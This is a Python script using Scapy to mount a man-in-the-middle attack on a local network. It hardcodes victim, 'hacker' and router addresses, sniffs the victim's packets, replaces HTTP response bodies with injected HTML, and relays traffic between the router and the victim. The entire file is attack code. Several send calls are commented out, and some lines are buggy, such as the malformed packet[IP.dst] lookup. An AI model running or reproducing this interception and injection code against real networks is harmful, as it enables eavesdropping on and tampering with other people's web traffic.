from scapy.all import sniff, send, Raw
from scapy.layers.inet import IP, TCP
from scapy.layers.http import HTTPRequest, HTTPResponse
import gzip
import io
import zlib

# Define the victim's IP address
victim_ip = "192.168.11.69"
hacker_ip = "192.168.11.81"
router_ip = "192.168.11.115"

# Define network information
router_mac = "74:DA:38:EB:6F:DC"


def get_charset(http_headers):
    for header in http_headers.split('\r\n'):
        if 'Content-Type:' in header:
            if 'charset=' in header:
                return header.split('charset=')[-1].strip()
    return 'utf-8'  # Default to utf-8 if not specified


def decompress_content(content, encoding):
    if encoding == 'gzip':
        return zlib.decompress(content, 16+zlib.MAX_WBITS)
    elif encoding == 'deflate':
        return zlib.decompress(content)
    return content


def modify_packet(packet):
    if packet.haslayer(HTTPRequest):
        http_request = packet[HTTPRequest]
        print(f"HTTP Request: {http_request.Method.decode()} {http_request.Path.decode()}")
    elif packet.haslayer(HTTPResponse):
        tcp_layer = packet[TCP]
        http_response = packet[HTTPResponse]

        # Original HTML payload
        original_payload = packet[Raw].load.decode(errors='ignore')

        # New HTML content
        new_html_content = """
        <html>
        <head><title>Modified Page</title></head>
        <body><h1>This is a modified HTTP response</h1></body>
        </html>
        """

        # Create a new HTTP response payload with the new HTML content
        new_payload = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {}\r\n\r\n{}".format(
            len(new_html_content), new_html_content)

        # Modify the packet payload
        packet[Raw].load = new_payload.encode()

        # Recalculate checksums
        del packet[IP].chksum
        del packet[TCP].chksum

        # Send the modified packet
        """print(packet[Raw].load)
        packet.show()
        send(packet)"""

        print("Modified packet sent with new HTML content.")
        return packet

def packet_callback(packet):
    if packet.haslayer(IP):
        if packet[IP].src == victim_ip and packet[IP].dst == hacker_ip:
            print("========================================================================")
            print(f"Captured packet from {packet[IP].src} to {packet[IP].dst}")

            # Modify the packet's destination to the webserver IP
            packet[IP].dst = router_ip

            packet = modify_packet(packet)

            # Print packet.
            payload = packet[Raw].load
            http_headers = payload.decode('utf-8', errors='ignore')
            print(f"HTTP Headers:\n{http_headers}")

            # Send the modified packet back to the victim
            #send(packet)
            print(f"Forwarded packet to {packet[IP.dst]}")
            print("========================================================================")
            return
        else:
            sniff(prn=packet_callback, count=1)
            return
    else:
        sniff(prn=packet_callback, count=1)
        return

def packet_sendtrough(packet):
    if packet.haslayer(IP):
        if packet[IP].src == router_ip and packet[IP].dst == hacker_ip:
            print("========================================================================")
            print(f"Captured packet from {packet[IP].src} to {packet[IP].dst}")

            # Modify the packet's destination to the victim IP
            packet[IP].dst = victim_ip

            # Send the modified packet back to the victim
            send(packet)
            print(f"Forwarded packet to {packet[IP].dst}")
            print("========================================================================")
            return
        else:
            sniff(prn=packet_sendtrough, count=1)
            return
    else:
        sniff(prn=packet_sendtrough, count=1)
        return

# Sniff packets on the network and use packet_callback to process them
if __name__ == "__main__":
    while True:
        sniff(prn=packet_callback, count=1)
        sniff(prn=packet_sendtrough, count=1)